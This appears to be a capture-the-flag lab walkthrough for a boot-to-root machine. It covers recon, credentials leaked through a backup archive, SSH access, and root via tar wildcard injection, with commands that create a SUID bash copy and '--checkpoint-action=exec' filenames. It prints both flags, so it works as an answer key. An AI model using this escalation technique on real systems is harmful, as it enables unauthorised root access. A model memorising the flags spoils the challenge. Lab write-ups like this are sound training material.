## Boot 2 Root

1.Intended player flow Recon Player scans the target and sees: HTTP on 8080 SSH on 2222 Web browsing The homepage looks like a normal
internal portal. 

2.There are a few “interesting but not explicit” clues: Changelog Robots.txt Legacy/old portal Clue chain robots.txt hints at: 
backup/ /old/ changelog.txt mentions: legacy portal source archival backup retention /old/ confirms that old/legacy components still exist.

<img width="571" height="79" alt="image" src="https://github.com/user-attachments/assets/5df72a68-034f-4ba9-b2c3-9719383ffef3" />


3.Backup /source artifact Enumeration or browsing eventually reveals a backup/source archive (e.g. under /backup/). 

<img width="617" height="101" alt="image" src="https://github.com/user-attachments/assets/84255808-9a97-4ac8-89f5-4ec265ca3d30" />

<img width="711" height="197" alt="image" src="https://github.com/user-attachments/assets/c7c9ece3-4b35-4fe6-90ba-078c347ea337" />


4.That archive contains application /source files. 

<img width="1854" height="227" alt="image" src="https://github.com/user-attachments/assets/c3090c0e-28ca-424c-b8a0-6771942577eb" />
<img width="1009" height="342" alt="image" src="https://github.com/user-attachments/assets/b333d7d0-ae2c-4265-97d6-3b2007b8c1ad" />


5.Inside those files is a config /config artifact that reveals the dev account credentials. 

<img width="837" height="307" alt="image" src="https://github.com/user-attachments/assets/6e7f959e-81d1-4ce0-a064-f2668dfbd79c" />


6.Initial access The player uses those credentials to log in as dev via SSH. 

<img width="748" height="274" alt="image" src="https://github.com/user-attachments/assets/235e53b9-33bb-4979-b1db-c88925aa047a" />

7.User flag 

<img width="726" height="346" alt="image" src="https://github.com/user-attachments/assets/ce6888eb-eba9-4603-adbb-c66f81ab030d" />

->After gaining the user shell, the player reads the user flag from the dev user’s home directory: 

```/home/dev/user.txt``` 

The User flag : ```IR{y0u_g0t_th3_u53r_4cc355_g0_g3t_th3_n3xt_fl4g}```


8.Local enumeration Standard Linux enumeration reveals that the dev user can run a maintenance-related command with
elevated privileges without a password. 

-> Check sudo 

```sudo -l```
-> It revels this ```(ALL) NOPASSWD: /usr/local/bin/maintain```

9.Privilege escalation concept (wildcard injection) The intended learning step is that the maintenance workflow is
misconfigured and relies on unsafe execution behavior (the sort of thing a player should discover during local enumeration and script review).

-> So then we need to go back writable folder for creating malicious payload

```
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' > shell.sh
chmod +x shell.sh
```

10.The player should recognize the weakness, leverage it to obtain root, and then retrieve the root flag. Root flag 
Once root is obtained, the player reads: 

->By creating the wildcard filenames by 
```
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh shell.sh'
```
11.Run the vulnerable sudo script

```sudo /usr/local/bin/maintain```

12.Pop the root shell - ```/tmp/rootbash -p```

-> Use ```whoami``` for finding the flag

-> Grap the flag 
```cat /root/root.txt```

<img width="1416" height="780" alt="image" src="https://github.com/user-attachments/assets/c738d1e1-e662-40a2-94c6-6f2833ed1604" />

The root flag : ```IR{th1s_1s_r00t_fl4g_s0_y0u_3nt3r3d_1nt0_r3d_t3am1ng}```
